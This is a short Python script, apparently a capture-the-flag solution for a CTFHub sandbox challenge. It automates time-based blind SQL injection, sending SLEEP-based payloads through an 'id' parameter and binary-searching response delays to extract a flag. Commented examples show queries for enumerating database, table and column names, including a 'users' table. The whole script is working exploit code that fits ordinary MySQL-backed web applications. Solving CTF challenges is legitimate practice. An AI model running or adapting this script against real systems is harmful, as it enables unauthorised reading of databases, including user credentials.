import requests
import time
import string

URL = "http://challenge-bd0e1c1e3c5ce85e.sandbox.ctfhub.com:10800/"
CHARSET = string.ascii_lowercase + string.digits + "_"
DELAY = 2  # 睡眠秒数
THRESHOLD = DELAY * 0.7  # 判断阈值，留余量

def check(payload):
    start = time.time()
    requests.get(URL, params={"id": payload}, timeout=DELAY + 5)
    return time.time() - start >= THRESHOLD

def extract_char(pos, query):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"1 AND IF(ORD(SUBSTR(({query}),{pos},1))>{mid},SLEEP({DELAY}),0)-- -"
        if check(payload):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo != 32 else None

def extract_string(query, max_len=32):
    result = ""
    for i in range(1, max_len + 1):
        ch = extract_char(i, query)
        if not ch:
            break
        result += ch
        print(f"\r[*] {result}", end="", flush=True)
    print()
    return result

# 使用示例
#SELECT database()
#select group_concat(table_name) from information_schema.tables where table_schema = 'security'
# select group_concat(column_name) from information_schema.columns where table_name = 'users'
db_name = extract_string("select flag from flag")
print(f"[+] 数据库名: {db_name}")